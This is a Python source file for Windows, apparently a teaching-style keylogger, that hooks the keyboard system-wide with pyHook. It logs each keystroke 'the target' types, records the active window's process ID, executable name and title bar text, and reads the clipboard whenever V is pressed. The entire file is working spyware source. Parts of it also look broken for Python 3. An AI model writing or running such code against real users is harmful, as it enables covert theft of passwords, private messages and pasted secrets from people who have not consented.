from ctypes import *
import pythoncom

# pyhook doesnt have a python 3.8 version
import pyHook

import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
currentWindow = None


def getCurrentProcess():
    # get active window handle
    windowHandle = user32.GetForegroundWindow()

    # get process id
    pid = c_ulong(0)

    # pass handle to get pid
    user32.GetWindowThreadProcessId(windowHandle, byref(pid))
    processID = "%d" % pid.value

    executable = create_string_buffer("\x00" * 512)

    openedProcess = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    # find the actual executable name of the process
    psapi.GetModuleBaseNameA(openedProcess, None, byref(executable), 512)

    window_title = create_string_buffer("\x00" * 512)

    # grab full text of windows title bar
    length = user32.GetWindowTextA(windowHandle, byref(window_title), 512)

    print("")
    print("[PID: %s - %s - %s]" % (processID, executable.value, window_title.value))
    print("")

    kernel32.CloseHandle(windowHandle)
    kernel32.CloseHandle(openedProcess)


def keyState(event):
    global currentWindow

    # check if target changed windows
    if event.WindowName != currentWindow:
        currentWindow = event.WindowName
        getCurrentProcess()

    # if a standard key is pressed
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        # if they paste something then get the value of the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pastedValue = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % pastedValue)
        else:
            print("[%s]" % event.Key)
    return True


kl = pyHook.HookManager()
kl.KeyDown = keyState

# whenever the target presses on the keyboard, keyState function called with event object as parameter
kl.HookKeyboard()

pythoncom.PumpMessages()
